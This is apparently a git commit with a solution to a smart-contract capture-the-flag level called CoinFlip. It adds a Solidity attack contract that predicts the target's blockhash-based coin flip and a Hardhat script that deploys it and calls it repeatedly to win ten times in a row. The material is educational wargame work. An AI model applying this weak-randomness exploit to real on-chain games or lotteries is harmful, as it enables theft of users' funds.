7a6840c01ab42e5f046420b1ab765bdb08864b71
frenchkebab <tubowangin@gmail.com>
2022-09-19 22:30:26 +0900

    [04-CoinFlip #1] CoinFlip

---
+++ contracts/03-CoinFlip/AttackCoinFlip.sol
@@ -0,0 +1,45 @@
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.6.0;
+
+import "./CoinFlip.sol";
+import "./SafeMath.sol";
+
+contract AttackCoinFlip {
+    using SafeMath for uint256;
+    CoinFlip coinFlipAddr;
+    uint256 blockNumber;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    event ConsecutiveWins(uint256 wins);
+    event AttackResult(bool result, uint256 blockNumber);
+
+    constructor(CoinFlip _addr) public {
+        coinFlipAddr = _addr;
+    }
+
+    function attack() external returns (bool) {
+        require(blockNumber < block.number, "Wait for next block");
+
+        blockNumber = block.number;
+
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+
+        bool result = coinFlipAddr.flip(side);
+
+        emit AttackResult(result, block.number);
+    }
+
+    function getConsecutiveWins() external returns (uint256) {
+        uint256 wins = coinFlipAddr.consecutiveWins();
+        emit ConsecutiveWins(wins);
+        return wins;
+    }
+
+    function getBlockNumber() external view returns (uint256) {
+        return block.number;
+    }
+}
---
+++ scripts/03-CoinFlip/coinFlip.js
@@ -0,0 +1,48 @@
+const { Alchemy } = require("alchemy-sdk");
+const hre = require("hardhat");
+const { ethers } = hre;
+
+async function main() {
+  const COINFLIP_ADDRESS = "0x66BD1DAFc0a8ea1E909128a374b98EAbE1B7066e";
+  const alchemy = new Alchemy();
+  let latestBlockNumber;
+
+  const ContractFactory = await hre.ethers.getContractFactory("AttackCoinFlip");
+  const contract = await ContractFactory.deploy(
+    await hre.ethers.utils.getAddress(COINFLIP_ADDRESS)
+  );
+
+  await contract.deployed();
+
+  const coinFlip = await (
+    await ethers.getContractFactory("CoinFlip")
+  ).attach(COINFLIP_ADDRESS);
+
+  const timer = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+  let wins = (await coinFlip.consecutiveWins()).toString();
+  console.log("wins: ", wins);
+
+  (async () => {
+    while (wins < 10) {
+      const blockNumber = alchemy.core.getBlockNumber();
+      if (!latestBlockNumber) {
+        latestBlockNumber = blockNumber;
+      }
+
+      if (blockNumber !== latestBlockNumber) {
+        console.log("blockNuber: ", await blockNumber);
+        await contract.attack();
+        wins = (await coinFlip.consecutiveWins()).toString();
+        console.log("successfully attacked");
+        console.log("wins: ", await wins);
+      }
+      await timer(2000);
+    }
+  })();
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
